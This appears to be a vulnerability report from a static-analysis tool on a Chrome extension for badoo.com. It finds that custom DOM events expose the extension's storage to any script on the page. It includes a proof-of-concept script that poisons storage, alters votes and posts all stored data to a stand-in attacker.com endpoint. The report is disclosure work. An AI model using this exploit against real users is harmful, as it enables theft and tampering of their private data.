# CoCo Analysis: aallcmelejdfkmcdijkklloblonbeiap

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (document_eventListener → chrome_storage_local_set_sink, chrome_storage_local_clear_sink)

---

## Sink: document_eventListener → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/aallcmelejdfkmcdijkklloblonbeiap/opgen_generated_files/cs_0.js
Line 532: `document.addEventListener("bs_"+name, function(event){`
Line 533: `var result = func(event.detail.params);`
Line 558: `var vote = params.vote;`
Line 562: `storage.set(buildStorageObject(savedEncounter.user_id, savedEncounter))`

Multiple similar flows for saveEncounter, importAll, vote, and favorite functions.

**Code:**

```javascript
// Content script - Export functions via DOM events
var exportAsyncFunction = function(name, func){
    document.addEventListener("bs_"+name, function(event){ // ← attacker can dispatch events
        func(event.detail.params, function(result){ // ← attacker-controlled params
            document.dispatchEvent(new CustomEvent(event.detail.resultListenerKey, { detail: result })); // ← sends result back to page
        });
    })
}

var exportFunction = function(name, func){
    document.addEventListener("bs_"+name, function(event){ // ← attacker can dispatch events
        var result = func(event.detail.params); // ← attacker-controlled params
        document.dispatchEvent(new CustomEvent(event.detail.resultListenerKey, { detail: result }));
    })
}

// VULNERABILITY 1: Storage poisoning + retrieval
exportAsyncFunction("importAll", function (params, callback) {
    var allData = JSON.parse(params); // ← attacker-controlled JSON
    storage.clear(); // ← clears all storage
    storage.set({ historyCount: allData.history.length }); // ← attacker data stored
    for (var historyIndex = 0; historyIndex < allData.history.length; historyIndex++){
        var profileId = allData.history[historyIndex]; // ← attacker-controlled
        storage.set(buildStorageObject('historyItem' + (allData.history.length - historyIndex), profileId));
        var profile = allData.profiles[profileId]; // ← attacker-controlled
        storage.set(buildStorageObject(profileId, profile)); // ← storage poisoning
    }
    callback();
});

exportAsyncFunction("getAll", function (params, callback) {
    storage.get('historyCount', function (historyCount) {
        collectAll(historyCount.historyCount, 0, {history: [], profiles: {}}, function(allData){
            callback(allData); // ← sends all storage data back to page via CustomEvent
        });
    });
});

// VULNERABILITY 2: Storage manipulation
exportFunction("vote", function (params) {
    var profileId = params.profileId; // ← attacker-controlled
    var vote = params.vote; // ← attacker-controlled
    storage.get(profileId, function (storageObject) {
        var savedEncounter = storageObject[profileId];
        savedEncounter.vote = vote; // ← attacker data
        storage.set(buildStorageObject(savedEncounter.user_id, savedEncounter)) // ← storage write
    });
});

exportFunction("saveEncounter", function(encounter){ // ← attacker-controlled encounter object
    storage.get('historyCount', function (historyCount) {
        // ... processing ...
        storage.set(buildStorageObject(encounter.user_id, encounter)); // ← storage poisoning
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM events (document.addEventListener)

**Attack:**

```javascript
// Attacker's malicious code on badoo.com (injected or via XSS)

// Attack 1: Poison storage with malicious data
var poisonData = {
    history: ['malicious_user_1', 'malicious_user_2'],
    profiles: {
        'malicious_user_1': {
            user_id: 'malicious_user_1',
            name: 'Attacker Profile',
            vote: 'yes',
            favorite: 'yes',
            malicious_payload: 'injected_data'
        }
    }
};

document.dispatchEvent(new CustomEvent("bs_importAll", {
    detail: {
        params: JSON.stringify(poisonData),
        resultListenerKey: "import_complete"
    }
}));

// Attack 2: Retrieve all stored data
document.addEventListener("retrieve_all_data", function(event) {
    console.log("Leaked storage:", event.detail);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: JSON.stringify(event.detail)
    });
});

document.dispatchEvent(new CustomEvent("bs_getAll", {
    detail: {
        params: {},
        resultListenerKey: "retrieve_all_data"
    }
}));

// Attack 3: Manipulate user votes
document.dispatchEvent(new CustomEvent("bs_vote", {
    detail: {
        params: { profileId: 'target_user_id', vote: 'attacker_controlled_vote' },
        resultListenerKey: "vote_complete"
    }
}));
```

**Impact:** Complete storage exploitation chain. An attacker-controlled webpage on badoo.com can:
1. **Storage poisoning**: Clear and replace all extension storage with malicious data via `importAll`
2. **Information disclosure**: Retrieve and exfiltrate all stored user data (viewing history, votes, favorites) via `getAll` with results sent back to the page
3. **Data manipulation**: Modify user votes and encounters via `vote` and `saveEncounter` functions

The extension exposes privileged storage APIs to the webpage through DOM events. Since the content script runs on badoo.com and any malicious script on that domain (XSS, compromised badoo.com, or attacker-controlled subdomain) can dispatch these custom events, this creates multiple exploitable attack paths with complete read/write control over extension storage.
